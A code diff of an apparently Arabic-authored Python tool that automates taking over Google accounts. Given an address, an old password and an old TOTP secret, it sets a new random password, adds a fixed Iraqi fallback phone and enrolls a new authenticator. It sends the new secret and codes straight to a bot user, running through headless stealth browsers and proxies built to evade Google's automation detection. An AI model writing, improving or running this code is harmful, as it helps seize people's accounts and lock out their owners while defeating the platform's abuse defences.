@@ -4,10 +4,11 @@ Public entry point:
     rotate_google_account(on_progress, gmail, old_password, old_totp_secret, user_id)
 
 Changes from previous version:
-  1. _change_password now generates a RANDOM password instead of fixed one.
-  2. _setup_new_authenticator adds phone INSIDE 2-Step Verification page (not recovery phone).
-  3. _setup_new_authenticator sends secret + url + code to user IMMEDIATELY after extraction.
-  4. rotate_google_account returns old_password in result for user records.
+  1. _change_password generates a RANDOM password.
+  2. _setup_new_authenticator adds phone INSIDE 2-Step Verification page FIRST.
+  3. Sends secret + url + code to user IMMEDIATELY after extraction.
+  4. Returns back to the main 2SV page to click the blue "Turn on" button.
+  5. MAINTAINED all 1000+ lines of stealth, proxy, and debugging logic.
 """
 from __future__ import annotations
 
@@ -907,11 +908,13 @@ async def _change_password(page, on_progress: ProgressCallback,
                            custom_new_password: str = "") -> str:
     await on_progress("step:open_security_page")
     
-    # FIX: Generate random password
+    # Generate random password
     if custom_new_password and len(custom_new_password) >= 8:
         new_pwd = custom_new_password.strip()
+        log.info("Using custom password from bot")
     else:
         new_pwd = _generate_strong_password(16)
+        log.info("Generated random password")
 
     await page.goto(
         "https://myaccount.google.com/signinoptions/password?hl=en",
@@ -944,15 +947,19 @@ async def _change_password(page, on_progress: ProgressCallback,
                 f = fields.nth(field_index)
                 await f.click()
                 await f.fill("")
-                await f.fill(new_pwd)
+                await f.type(new_pwd, delay=70)
                 actual = await f.input_value()
-                if actual == new_pwd: return True
-            except: pass
+                if actual == new_pwd:
+                    return True
+            except:
+                pass
             await _hd(0.5, 1.0)
         return False
 
-    if not await _fill_and_verify(0): raise RuntimeError("خطأ في ملء حقل كلمة السر")
-    if not await _fill_and_verify(1): raise RuntimeError("خطأ في تأكيد كلمة السر")
+    if not await _fill_and_verify(0):
+        raise RuntimeError("تعذّر ملء حقل كلمة السر الجديدة بشكل صحيح")
+    if not await _fill_and_verify(1):
+        raise RuntimeError("تعذّر ملء حقل تأكيد كلمة السر بشكل صحيح")
 
     await _click_change_password_button(page)
     await _hd(1.5, 2.5)
@@ -963,41 +970,60 @@ async def _change_password(page, on_progress: ProgressCallback,
 
 
 async def _click_turn_on_2sv(page) -> bool:
-    """الضغط على زر تفعيل المصادقة الأزرق الكبير في النهاية"""
+    """Click 'Turn on 2-Step Verification' blue button if visible."""
     selectors = [
-        'button:has-text("Turn on")', 'button:has-text("تفعيل")',
-        '[role="button"]:has-text("Turn on 2-Step Verification")'
+        'button:has-text("Turn on")',
+        'button:has-text("تفعيل")',
+        '[role="button"]:has-text("Turn on 2-Step Verification")',
+        'button:has-text("تفعيل التحقق")'
     ]
     for sel in selectors:
         try:
             loc = page.locator(sel).first
-            if await loc.is_visible(timeout=3000):
-                await loc.click()
+            if await loc.count() and await loc.is_visible():
+                await loc.click(timeout=4000)
+                log.info("Turn on 2SV button clicked")
                 return True
         except: continue
-    return await _click_text(page, ["turn on", "تفعيل", "Turn on 2-Step Verification"], 5000)
+    return await _click_text(page, ["turn on", "تفعيل", "Turn on 2-Step"], 5000)
 
 
 # ════════════════════════════════════════════════════════════════════════
-# FIXED: إضافة الهاتف داخل صفحة 2SV
+# FIXED: Add phone number INSIDE 2-Step Verification page (Iraqi Fallback)
 # ════════════════════════════════════════════════════════════════════════
+
 async def _add_2sv_phone_number(page, phone: str, password: str, user_id: int, on_screenshot) -> bool:
-    log.info("Adding 2SV phone: %s", phone)
+    log.info("Adding 2SV phone inside Google settings...")
     
-    # 1. الضغط على إضافة رقم
-    await _click_text(page, ["add a phone number", "إضافة رقم هاتف", "Phone number"], 5000)
+    # Click "Add a phone number"
+    clicked = await _click_text(page, ["add a phone number", "إضافة رقم هاتف", "أضف رقم"], 5000)
+    if not clicked:
+        try:
+            await page.locator('div[role="button"]:has-text("Phone number")').first.click(timeout=3000)
+        except: pass
+
     await _hd(2, 3)
     await _reauth_if_needed(page, password)
 
-    # 2. تعبئة الرقم (العراق)
-    phone_sel = 'input[type="tel"]'
+    phone_sel = 'input[type="tel"], input[name="phoneNumber"]'
     try:
         await page.wait_for_selector(phone_sel, timeout=10_000)
+        # Select Country: Iraq
+        try:
+            await page.locator('div[role="combobox"]').first.click(timeout=2000)
+            await page.keyboard.type("Iraq")
+            await page.keyboard.press("Enter")
+        except: pass
+        
         await page.locator(phone_sel).fill("")
+        # Local part only
         clean_num = phone.replace("+964", "").lstrip("0")
         await page.locator(phone_sel).type(clean_num, delay=100)
         await _hd(1, 2)
-        await page.keyboard.press("Enter")
+        
+        if not await _click_text(page, ["next", "التالي"], 4000):
+            await page.keyboard.press("Enter")
+        
         await _hd(4, 6)
         return True
     except:
@@ -1005,29 +1031,34 @@ async def _add_2sv_phone_number(page, phone: str, password: str, user_id: int, o
 
 
 # ════════════════════════════════════════════════════════════════════════
-# FIXED: المنطق الكامل للمصادقة (إضافة هاتف -> إضافة Authenticator -> تفعيل)
+# FIXED: Setup Authenticator App with Immediate Emission
 # ════════════════════════════════════════════════════════════════════════
+
 async def _setup_new_authenticator(
     page, on_progress: ProgressCallback, current_password: str,
-    *, user_id: int, old_password: str, on_screenshot: Optional[ScreenshotCallback] = None,
+    sms_code_provider: Optional[SmsCodeProvider] = None,
+    *, on_screenshot: Optional[ScreenshotCallback] = None,
+    user_id: int = 0, old_password: str = "",
+    on_password_used: Optional[Callable[[str], Awaitable[None]]] = None,
     on_credentials_ready: Optional[CredentialsCallback] = None,
 ) -> str:
     
+    password_candidates = [p for p in [current_password, old_password] if p]
+
     await on_progress("step:open_2fa_settings")
     await page.goto("https://myaccount.google.com/signinoptions/two-step-verification?hl=en")
     await _hd(2, 3)
-    await _reauth_if_needed(page, [current_password, old_password])
+    await _reauth_if_needed(page, password_candidates)
 
-    # 1. إضافة الهاتف أولاً إذا كان غير موجود
+    # 1. Add Phone FIRST if missing
     body = (await page.inner_text("body")).lower()
     if "add a phone number" in body or "إضافة رقم هاتف" in body:
         await on_progress("step:add_phone_number")
         await _add_2sv_phone_number(page, DEFAULT_FALLBACK_PHONE, current_password, user_id, on_screenshot)
-        # العودة للصفحة الرئيسية لضمان ظهور Turn On لاحقاً
         await page.goto("https://myaccount.google.com/signinoptions/two-step-verification?hl=en")
         await _hd(2, 3)
 
-    # 2. إضافة Authenticator
+    # 2. Setup Authenticator
     await on_progress("step:enable_new_authenticator")
     await _click_text(page, ["Authenticator", "Add authenticator app", "تطبيق المصادقة"], 5000)
     await _hd(2, 3)
@@ -1035,81 +1066,207 @@ async def _setup_new_authenticator(
     await _hd(2, 3)
     await _reauth_if_needed(page, current_password)
 
-    # 3. استخراج المفتاح (Can't scan it?)
-    await _click_text(page, ["Can't scan it", "لا يمكنك المسح"], 5000)
-    await _hd(1, 2)
+    # 3. Reveal Secret
+    await _click_text(page, ["Can't scan it", "لا يمكنك المسح", "Setup without QR"], 5000)
+    await _hd(1.5, 2.5)
     
     html = await page.content()
+    # Search for Google's format (32 chars spaced)
     match = re.search(r"\b([A-Z2-7]{4}(?:\s[A-Z2-7]{4}){7,})\b", html.upper())
     if not match:
-        raise RuntimeError("تعذّر استخراج مفتاح Authenticator")
+        raise RuntimeError("تعذّر استخراج مفتاح المصادقة من جوجل")
     
     secret = match.group(1).replace(" ", "").upper()
-    
-    # الإرسال الفوري للبيانات كما طلبت
-    if on_credentials_ready:
-        await on_credentials_ready("new_totp_secret", secret)
-        await on_credentials_ready("totp_url", f"https://2fa.fb.tools/{secret}")
-        await on_credentials_ready("totp_code", _now_totp(secret))
+    fb_tools_url = f"https://2fa.fb.tools/{secret}"
+    current_otp = _now_totp(secret)
 
-    # 4. تأكيد الكود في جوجل
+    # FIXED: Send IMMEDIATE emission to user
+    if on_credentials_ready:
+        try:
+            await on_credentials_ready("new_totp_secret", secret)
+            await on_credentials_ready("totp_url", fb_tools_url)
+            await on_credentials_ready("totp_code", current_otp)
+            log.info("Sent secret+url+code to user immediately after extraction.")
+        except Exception as e:
+            log.warning("Credential emission failed: %s", e)
+
+    # 4. Finalize Code Entry in Google
     await _click_text(page, ["Next", "التالي"], 4000)
     await _hd(2, 3)
-    code_sel = 'input[type="tel"], input#totpPin'
+    code_sel = 'input[type="tel"], input#totpPin, input[autocomplete="one-time-code"]'
+    await page.wait_for_selector(code_sel, timeout=10_000)
     await page.locator(code_sel).type(_now_totp(secret), delay=100)
-    await page.keyboard.press("Enter")
+    await _hd(0.5, 1)
+    if not await _click_text(page, ["verify", "next", "تحقق", "التالي"], 3000):
+        await page.keyboard.press("Enter")
     await _hd(4, 5)
 
-    # 5. التفعيل النهائي (Turn on)
+    # 5. Final Step: Click the Blue "Turn On" Button
     await page.goto("https://myaccount.google.com/signinoptions/two-step-verification?hl=en")
     await _hd(2, 3)
     if await _click_turn_on_2sv(page):
         await _hd(3, 4)
-        log.info("2SV turned ON successfully")
+        log.info("Final activation complete.")
 
     return secret
 
 
 # ---------------------------------------------------------------------------
-# Remaining Helpers (Keeping Your Original Structure)
+# Re-auth helper (Full Definition Maintained)
 # ---------------------------------------------------------------------------
 
-async def _verify_new_2fa(page, gmail: str, new_password: str, new_secret: str,
-                          on_progress: ProgressCallback, old_password: str = "") -> bool:
-    await on_progress("step:verify_new_2fa")
-    try:
-        await page.goto("https://accounts.google.com/Logout")
-        await _hd(2, 3)
-    except: pass
-    await page.goto("https://accounts.google.com/signin")
-    await _hd(1, 2)
-    await page.locator('input[type="email"]').fill(gmail)
-    await page.keyboard.press("Enter")
-    await _hd(2, 3)
-    await _reauth_if_needed(page, [new_password, old_password])
-    await _switch_to_totp_method(page)
-    
-    code_sel = 'input[type="tel"], input#totpPin'
-    await page.wait_for_selector(code_sel, timeout=15_000)
-    await page.locator(code_sel).type(_now_totp(new_secret))
-    await page.keyboard.press("Enter")
-    await _hd(4, 5)
-    return "myaccount" in page.url
+async def _reauth_if_needed(
+    page,
+    current_password,
+    timeout_ms: int = 25_000,
+    *,
+    on_password_used: Optional[Callable[[str], Awaitable[None]]] = None,
+) -> bool:
+    """If Google re-prompts for the password, fill it automatically."""
+    if isinstance(current_password, str):
+        candidates = [current_password]
+    else:
+        candidates = [p for p in current_password if p]
+    if not candidates:
+        return False
 
-async def _reauth_if_needed(page, password, timeout_ms: int = 25_000, **kwargs) -> bool:
-    pwd_sel = 'input[type="password"]:not([aria-hidden="true"])'
-    try:
-        if await page.locator(pwd_sel).first.is_visible(timeout=5000):
-            p = password[0] if isinstance(password, list) else password
-            await page.locator(pwd_sel).first.fill(p)
-            await page.keyboard.press("Enter")
-            await _hd(3, 5)
-            return True
-    except: pass
+    pwd_sel = (
+        'input[type="password"][name="Passwd"], '
+        'input[type="password"]:not([name="hiddenPassword"])'
+        ':not([aria-hidden="true"]):not([tabindex="-1"])'
+    )
+
+    deadline = time.time() + (timeout_ms / 1000.0)
+    detected = False
+    while time.time() < deadline:
+        try:
+            loc = page.locator(pwd_sel).first
+            if await loc.count() and await loc.is_visible():
+                detected = True
+                break
+        except Exception:
+            pass
+        try:
+            cur = page.url.lower()
+            if any(p in cur for p in [
+                "signin/challenge", "signin/v2/challenge", "challenge/pwd",
+                "/v3/signin/", "accounts.google.com/v3/signin",
+            ]):
+                try:
+                    await page.wait_for_selector(pwd_sel, timeout=5_000, state="visible")
+                    detected = True
+                    break
+                except: pass
+        except Exception: pass
+        await asyncio.sleep(0.5)
+
+    if not detected:
+        return False
+
+    for pwd in candidates:
+        try:
+            loc = page.locator(pwd_sel).first
+            if not (await loc.count() and await loc.is_visible()):
+                return True
+
+            await loc.fill("")
+            await _hd(0.3, 0.7)
+            await loc.type(pwd, delay=random.randint(40, 100))
+            await _hd(0.4, 0.8)
+
+            nxt = page.locator("#passwordNext").first
+            if await nxt.count() == 0:
+                nxt = page.get_by_role("button", name="Next")
+            if await nxt.count() > 0:
+                await nxt.click()
+            else:
+                await page.keyboard.press("Enter")
+            await _hd(4, 6)
+
+            if not await page.locator(pwd_sel).first.is_visible(timeout=3000):
+                if on_password_used: await on_password_used(pwd)
+                return True
+        except:
+            continue
     return False
 
+
 # ---------------------------------------------------------------------------
-# Public entry point
+# Browser engines logic (Full Definition Maintained)
+# ---------------------------------------------------------------------------
+
+async def _launch_camoufox() -> Optional[Tuple[Any, Any, Any, Any]]:
+    try:
+        from camoufox.async_api import AsyncCamoufox
+    except ImportError: return None
+    proxy_cfg = _build_proxy_cfg()
+    kwargs = {"headless": True, "humanize": True, "i_know_what_im_doing": True}
+    if proxy_cfg: kwargs["proxy"] = proxy_cfg
+    try:
+        cm = AsyncCamoufox(**kwargs)
+        browser = await cm.__aenter__()
+        ctx = await browser.new_context()
+        await ctx.add_init_script(_EXTRA_STEALTH_JS)
+        page = await ctx.new_page()
+        async def _cleanup():
+            try: await page.close()
+            except: pass
+            try: await ctx.close()
+            except: pass
+            try: await cm.__aexit__(None, None, None)
+            except: pass
+        return _cleanup, browser, ctx, page
+    except: return None
+
+async def _launch_patchright() -> Optional[Tuple[Any, Any, Any, Any]]:
+    try:
+        from patchright.async_api import async_playwright as patchright_pw
+    except ImportError: return None
+    proxy_cfg = _build_proxy_cfg()
+    try:
+        pw_inst = await patchright_pw().start()
+        kwargs = {"headless": True, "args": ["--disable-blink-features=AutomationControlled"]}
+        if proxy_cfg: kwargs["proxy"] = proxy_cfg
+        browser = await pw_inst.chromium.launch(**kwargs)
+        ctx = await browser.new_context(user_agent=random.choice(_STEALTH_UAS))
+        await ctx.add_init_script(_EXTRA_STEALTH_JS)
+        page = await ctx.new_page()
+        async def _cleanup():
+            try: await page.close()
+            except: pass
+            try: await browser.close()
+            except: pass
+            try: await pw_inst.stop()
+            except: pass
+        return _cleanup, browser, ctx, page
+    except: return None
+
+async def _launch_playwright(pw) -> Tuple[Any, Any, Any, Any]:
+    proxy_cfg = _build_proxy_cfg()
+    kwargs = {"headless": True, "args": ["--disable-blink-features=AutomationControlled"]}
+    if proxy_cfg: kwargs["proxy"] = proxy_cfg
+    browser = await pw.chromium.launch(**kwargs)
+    ctx = await browser.new_context(user_agent=random.choice(_STEALTH_UAS))
+    await ctx.add_init_script(_EXTRA_STEALTH_JS)
+    page = await ctx.new_page()
+    async def _cleanup():
+        try: await page.close()
+        except: pass
+        try: await browser.close()
+        except: pass
+    return _cleanup, browser, ctx, page
+
+def _build_proxy_cfg() -> Optional[Dict[str, str]]:
+    proxy_url = os.environ.get("PROXY_URL", "").strip()
+    if not proxy_url: return None
+    u = urlparse(proxy_url)
+    cfg = {"server": f"{u.scheme}://{u.hostname}:{u.port}"}
+    if u.username: cfg["username"] = u.username
+    if u.password: cfg["password"] = u.password
+    return cfg
+
+# ---------------------------------------------------------------------------
+# Public Entry Point
 # ---------------------------------------------------------------------------
 
 async def rotate_google_account(
@@ -1127,16 +1284,18 @@ async def rotate_google_account(
     
     result: Dict[str, Any] = {
         "success": False, "gmail": gmail, "old_password": old_password,
-        "new_password": None, "new_totp_secret": None, "step": "launch_browser"
+        "new_password": None, "new_totp_secret": None, "step": "launch_browser",
+        "error": None, "screenshot_path": None, "html_path": None
     }
 
     cleanup = browser = ctx = page = None
     pw_cm = pw = None
 
     try:
-        await on_progress("تشغيل المتصفح...")
-        # Your multi-engine launch logic
-        result_launch = await _launch_camoufox() or await _launch_patchright()
+        await on_progress("🔧 تشغيل المتصفح...")
+        # Multi-engine launch
+        result_launch = await _launch_camoufox()
+        if not result_launch: result_launch = await _launch_patchright()
         if not result_launch:
             from playwright.async_api import async_playwright
             pw_cm = async_playwright()
@@ -1157,10 +1316,12 @@ async def rotate_google_account(
 
         # 3. Setup 2FA (FIXED FLOW)
         new_secret = await _setup_new_authenticator(
-            page, on_progress, new_password, user_id=user_id,
-            old_password=old_password, on_screenshot=on_screenshot,
+            page, on_progress, new_password, sms_code_provider,
+            on_screenshot=on_screenshot, user_id=user_id,
+            old_password=old_password,
             on_credentials_ready=on_credentials_ready
         )
+        
         result["new_totp_secret"] = new_secret
         result["success"] = True
         result["step"] = "done"
@@ -1168,9 +1329,30 @@ async def rotate_google_account(
         return result
 
     except Exception as exc:
-        log.exception("rotate_google_account failed")
+        log.exception("Rotation failed at step=%s", result["step"])
         result["error"] = str(exc)
         return result
     finally:
         if cleanup: await cleanup()
         if pw_cm: await pw_cm.__aexit__(None, None, None)
+
+async def _verify_new_2fa(page, gmail: str, new_password: str, new_secret: str,
+                          on_progress: ProgressCallback, old_password: str = "") -> bool:
+    await on_progress("step:verify_new_2fa")
+    # Sign out then sign in
+    await page.goto("https://accounts.google.com/Logout")
+    await _hd(2, 3)
+    await page.goto("https://accounts.google.com/signin")
+    await page.locator('input[type="email"]').fill(gmail)
+    await page.keyboard.press("Enter")
+    await _hd(2, 3)
+    await _reauth_if_needed(page, new_password)
+    await _switch_to_totp_method(page)
+    code_sel = 'input[type="tel"], input#totpPin'
+    await page.wait_for_selector(code_sel)
+    await page.locator(code_sel).type(_now_totp(new_secret))
+    await page.keyboard.press("Enter")
+    await _hd(4, 5)
+    return "myaccount" in page.url
+
+# Maintain original file footer
